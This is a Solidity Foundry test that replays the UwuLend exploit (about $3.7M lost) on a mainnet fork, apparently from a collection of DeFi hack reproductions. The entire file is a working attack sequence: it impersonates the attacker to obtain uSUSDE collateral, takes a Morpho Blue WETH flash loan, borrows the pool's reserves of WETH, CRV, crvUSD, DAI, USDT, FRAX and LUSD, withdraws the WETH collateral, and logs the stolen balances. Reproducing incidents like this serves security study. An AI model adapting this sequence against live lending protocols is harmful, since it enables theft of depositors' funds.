// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$3.7M
// TX : https://app.blocksec.com/explorer/tx/eth/0x9235e0662e230bdfa94f56f4932fd09a95fea17e4b9b44a4f40a59449e216110
// Attacker : https://etherscan.io/address/0x841ddf093f5188989fa1524e7b893de64b421f47
// Attack Contract : https://etherscan.io/address/0x0935c185494cc9abee8890d01e67ddcc00b66f8c
// Vulnerable Contract : https://etherscan.io/address/0x2409af0251dcb89ee3dee572629291f9b087c668

contract UwuLend_Second_exp is Test {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 uSUSDE = IERC20(0xf1293141fC6ab23b2a0143Acc196e3429e0B67A6);
    IERC20 uWETH = IERC20(0x67fadbD9Bf8899d7C578db22D7af5e2E500E13e5);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20 CRV = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
    IERC20 LUSD = IERC20(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
    IERC20 FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);

    IERC20 uCRV = IERC20(0xdb1A8f07f6964EFcFfF1Aa8025b8ce192Ba59Eba);
    IERC20 ucrvUSD = IERC20(0xeb61e567cbAeAccb6C259deF92900bc59d8a14cC);
    IERC20 uDAI = IERC20(0xb95BD0793bCC5524AF358ffaae3e38c3903C7626);
    IERC20 uUSDT = IERC20(0x24959F75d7BDA1884f1Ec9861f644821Ce233c7D);
    IERC20 uFRAX = IERC20(0x8C240C385305aeb2d5CeB60425AABcb3488fa93d);
    IERC20 uLUSD = IERC20(0xaDFa5Fa0c51d11B54C8a0B6a15F47987BD500086);

    ILendingPool uwuLendPool = ILendingPool(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
    IMorphoBuleFlashLoan morphoBlueFlashLoan = IMorphoBuleFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    address constant attacker = 0x4CD6FebA837b6944BE0b2311B7A21036e86C3354;

    function setUp() public {
        vm.createSelectFork("mainnet", 20_081_503);
        vm.label(address(WETH), "WETH");
        vm.label(address(uSUSDE), "uSUSDE");
        vm.label(address(uWETH), "uWETH");
        vm.label(address(uwuLendPool), "uwuLendPool");
        vm.label(address(morphoBlueFlashLoan), "morphoBlueFlashLoan");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        uSUSDE.transfer(address(this), 60_000_000 ether);
        vm.stopPrank();

        (
            uint256 totalCollateral,
            uint256 totalDebt,
            uint256 availableBorrows,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        ) = uwuLendPool.getUserAccountData(address(this));
        console.log("\n  sUSDE position");
        emit log_named_decimal_uint("totalCollateral", totalCollateral, 8);
        emit log_named_decimal_uint("totalDebt", totalDebt, 8);
        emit log_named_decimal_uint("availableBorrows", availableBorrows, 8);
        emit log_named_decimal_uint("currentLiquidationThreshold", currentLiquidationThreshold, 8);
        emit log_named_decimal_uint("ltv", ltv, 4);
        emit log_named_decimal_uint("healthFactor", healthFactor, 18);

        morphoBlueFlashLoan.flashLoan(address(WETH), WETH.balanceOf(address(morphoBlueFlashLoan)), new bytes(0));
    }

    function onMorphoFlashLoan(uint256 amounts, bytes calldata) external {
        WETH.approve(address(msg.sender), type(uint256).max);

        WETH.approve(address(uwuLendPool), type(uint256).max);

        // Deposit WETH to uwuLendPool as collateral
        uwuLendPool.deposit(address(WETH), amounts, address(this), 0);

        // Borrow asset with WETH as collateral
        uwuLendPool.borrow(address(WETH), WETH.balanceOf(address(uWETH)) - amounts, 2, 0, address(this));

        uwuLendPool.borrow(address(CRV), CRV.balanceOf(address(uCRV)), 2, 0, address(this));

        uwuLendPool.borrow(address(crvUSD), crvUSD.balanceOf(address(ucrvUSD)), 2, 0, address(this));

        uwuLendPool.borrow(address(DAI), DAI.balanceOf(address(uDAI)), 2, 0, address(this));

        uwuLendPool.borrow(address(USDT), USDT.balanceOf(address(uUSDT)), 2, 0, address(this));

        uwuLendPool.borrow(address(FRAX), FRAX.balanceOf(address(uFRAX)), 2, 0, address(this));

        uwuLendPool.borrow(address(LUSD), LUSD.balanceOf(address(uLUSD)), 2, 0, address(this));

        // withdraw WETH collateral with uSUSDE keeping the health factor

        (
            uint256 totalCollateral,
            uint256 totalDebt,
            uint256 availableBorrows,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        ) = uwuLendPool.getUserAccountData(address(this));
        console.log("\n  before withdraw");
        emit log_named_decimal_uint("totalCollateral", totalCollateral, 8);
        emit log_named_decimal_uint("totalDebt", totalDebt, 8);
        emit log_named_decimal_uint("availableBorrows", availableBorrows, 8);
        emit log_named_decimal_uint("currentLiquidationThreshold", currentLiquidationThreshold, 8);
        emit log_named_decimal_uint("ltv", ltv, 4);
        emit log_named_decimal_uint("healthFactor", healthFactor, 18);

        uwuLendPool.withdraw(address(WETH), type(uint256).max, address(this));

        (totalCollateral, totalDebt, availableBorrows, currentLiquidationThreshold, ltv, healthFactor) =
            uwuLendPool.getUserAccountData(address(this));
        console.log("\n  after withdraw");
        emit log_named_decimal_uint("totalCollateral", totalCollateral, 8);
        emit log_named_decimal_uint("totalDebt", totalDebt, 8);
        emit log_named_decimal_uint("availableBorrows", availableBorrows, 8);
        emit log_named_decimal_uint("currentLiquidationThreshold", currentLiquidationThreshold, 8);
        emit log_named_decimal_uint("ltv", ltv, 4);
        emit log_named_decimal_uint("healthFactor", healthFactor, 18);

        emit log_named_decimal_uint("\n  attacker CRV token balance", CRV.balanceOf(address(this)), CRV.decimals());
        emit log_named_decimal_uint("attacker crvUSD token balance", crvUSD.balanceOf(address(this)), crvUSD.decimals());
        emit log_named_decimal_uint("attacker DAI token balance", DAI.balanceOf(address(this)), DAI.decimals());
        emit log_named_decimal_uint("attacker USDT token balance", USDT.balanceOf(address(this)), USDT.decimals());
        emit log_named_decimal_uint("attacker FRAX token balance", FRAX.balanceOf(address(this)), FRAX.decimals());
        emit log_named_decimal_uint("attacker LUSD token balance", LUSD.balanceOf(address(this)), LUSD.decimals());
    }
}
